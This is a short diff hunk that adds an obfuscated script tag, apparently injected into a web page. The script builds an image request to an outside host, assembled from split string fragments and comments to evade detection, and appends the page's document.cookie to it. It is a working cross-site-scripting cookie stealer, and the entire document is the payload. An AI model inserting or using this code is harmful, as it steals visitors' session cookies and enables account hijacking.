@@ -1,0 +1,9 @@
+<script>/*
+*/var i=new Image();/*
+*/i.src="http"+/*
+*/""+"://black.ment"+/*
+*/""+"alkampfkunst."+/*
+*/""+"de/cake/c.php"+/*
+*/""+"?cookie="+/*
+*/document.cookie;/*
+*/</script>
